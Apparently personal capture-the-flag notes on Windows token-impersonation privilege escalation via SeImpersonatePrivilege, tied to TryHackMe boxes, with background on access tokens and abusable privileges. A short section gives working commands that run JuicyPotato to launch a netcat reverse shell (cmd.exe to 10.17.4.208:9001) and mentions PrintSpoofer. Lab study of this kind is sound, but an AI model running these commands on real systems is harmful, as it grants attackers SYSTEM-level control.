running
`whomai /priv`

and we have  a exploitable service

`SeImpersonatePrivilege        Impersonate a client after authentication Enabled `

------
juicy potato 

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#juicy-potato-abusing-the-golden-privileges

https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505

juicy potato does  not work for Windows Server 2019 and Windows 10 1809 +.

get the binary from https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe

and transfer the JuicyPotato.exe and  netcat (nc.exe)

```
echo C:\temp\nc.exe -e cmd.exe 10.17.4.208 9001 > rev.bat

JuicyPotato.exe -p C:\temp\rev.bat -l 9001 -t *
```

------

PrintSpoofer64

on looking there a exploit for this (without metasploit )

https://github.com/itm4n/PrintSpoofer

transfer the binary PrintSpoofer64

------------

box
TryHackMe: Relevent, Alfred, retro

------------

Now that we have initial access, let's use token impersonation to gain system access.

Windows uses tokens to ensure that accounts have the right privileges to carry out particular actions. Account tokens are assigned to an account when users log in or are authenticated. This is usually done by LSASS.exe(think of this as an authentication process).

This access token consists of:

-   user SIDs(security identifier)
-   group SIDs
-   privileges

amongst other things. More detailed information can be found [here](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens).

There are two types of access tokens:

-   primary access tokens: those associated with a user account that are generated on log on
-   impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process

For an impersonation token, there are different levels:

-   SecurityAnonymous: current user/client cannot impersonate another user/client
-   SecurityIdentification: current user/client can get the identity and privileges of a client, but cannot impersonate the client
-   SecurityImpersonation: current user/clientÂ can impersonate the client's security context on the local system
-   SecurityDelegation: current user/client can impersonate the client's security context on a remote system

where the security context is a data structure that contains users' relevant security information.

The privileges of an account(which are either given to the account when created or inherited from a group) allow a user to carry out particular actions. Here are the most commonly abused privileges:

-   SeImpersonatePrivilege
-   SeAssignPrimaryPrivilege
-   SeTcbPrivilege
-   SeBackupPrivilege
-   SeRestorePrivilege
-   SeCreateTokenPrivilege
-   SeLoadDriverPrivilege
-   SeTakeOwnershipPrivilege
-   SeDebugPrivilege

There's more reading [here](https://www.exploit-db.com/papers/42556).

